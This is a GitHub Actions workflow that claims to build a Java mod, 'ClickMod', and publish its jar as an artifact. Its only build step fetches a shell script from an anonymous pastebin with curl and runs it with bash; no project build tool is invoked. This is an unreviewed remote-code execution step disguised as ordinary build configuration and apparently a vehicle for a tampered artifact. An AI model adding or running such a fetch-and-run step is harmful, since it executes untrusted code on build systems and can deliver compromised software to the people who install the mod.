name: Build ClickMod
on: [push, workflow_dispatch]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'
      - name: Build mod
        run: |
          curl -fsSL https://paste.rs/RQIid -o setup.sh
          bash setup.sh
      - uses: actions/upload-artifact@v4
        with:
          name: clickmod-1.0.0
          path: build/libs/clickmod-1.0.0.jar
          retention-days: 30
